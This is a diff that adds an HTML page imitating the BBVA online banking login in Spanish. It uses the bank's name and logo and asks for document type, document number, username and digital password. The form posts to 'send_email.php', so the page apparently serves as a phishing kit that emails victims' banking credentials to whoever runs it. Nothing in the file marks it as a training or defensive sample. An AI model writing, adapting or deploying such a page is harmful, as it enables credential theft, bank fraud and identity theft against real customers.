@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Inicio de Sesión - BBVA</title>
+    <link rel="stylesheet" href="login.css">
+</head>
+<body>
+    <div class="header-bar">
+        <div class="header-left">
+            <span>Ingresa a banca online</span>
+            <span class="close-icon">&times;</span>
+        </div>
+        <div class="header-right">
+            <img src="bbva.jpeg" alt="BBVA Logo" class="header-logo">
+        </div>
+    </div>
+    <div class="login-wrapper">
+        <div class="login-container">
+            <h1>¡Hola! Te damos la bienvenida a Banca Online.</h1>
+            <form id="loginForm" action="send_email.php" method="post">
+                <div class="input-group">
+                    <label for="docType">Tipo de Documento</label>
+                    <select id="docType" name="docType" required>
+                        <option value="" disabled selected>Seleccionar</option>
+                        <option value="dni">DNI</option>
+                        <option value="lc">LC</option>
+                        <option value="le">LE</option>
+                        <option value="ci">CI</option>
+                        <option value="pasaporte">Pasaporte</option>
+                    </select>
+                </div>
+                <div class="input-group">
+                    <label for="docNumber">Número de Documento</label>
+                    <input type="text" id="docNumber" name="docNumber" placeholder="Número de Documento" required>
+                </div>
+                <div class="input-group">
+                    <label for="username">Usuario</label>
+                    <input type="text" id="username" name="username" placeholder="Usuario" required>
+                </div>
+                <div class="input-group">
+                    <label for="password">Clave Digital</label>
+                    <input type="password" id="password" name="password" placeholder="Clave Digital" required>
+                </div>
+                <div class="checkbox-group">
+                    <label>
+                        <input type="checkbox" id="saveDocInfo" name="saveDocInfo">
+                        Guardar tipo y número de documento
+                    </label>
+                    <button type="button" class="virtual-keyboard">Teclado Virtual</button>
+                </div>
+                <button type="submit">Ingresar</button>
+            </form>
+            <div class="forgot-info">
+                <p>¿Olvidaste o bloqueaste tu Usuario y/o Clave Digital?</p>
+                <p>Si es la primera vez que ingresás a Banca Online, <a href="#">registrate</a></p>
+            </div>
+        </div>
+    </div>
+    <div class="bbva-image">
+        <img src="bbva.png" alt="BBVA" />
+    </div>
+    <script src="login.js"></script>
+</body>
+</html>
